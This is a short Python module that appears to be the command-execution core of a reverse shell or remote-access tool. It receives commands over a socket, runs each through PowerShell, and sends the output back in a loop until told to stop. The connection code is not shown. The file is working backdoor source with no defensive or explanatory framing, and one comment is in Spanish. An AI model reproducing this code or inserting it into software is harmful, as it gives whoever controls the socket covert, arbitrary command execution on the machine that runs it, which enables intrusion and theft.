import subprocess


def execute_command(my_socket):
    print("[+] Executing commands")
    
    while True:

        user_command = my_socket.receive_data()

        print("user command: ", user_command)

        if user_command == "stop":
            break

        if user_command == "":
            continue

        output = subprocess.run(["powershell",user_command], shell=True, capture_output=True) 
        if output.stderr.decode('utf-8') == "":
            cmd_result = output.stdout.decode('utf-8')
        else:
            cmd_result = output.stderr.decode("utf-8")

        #Serialization = data bytes + delimeter bytes (Indicando que se envio completo)
        my_socket.send_command_result(cmd_result)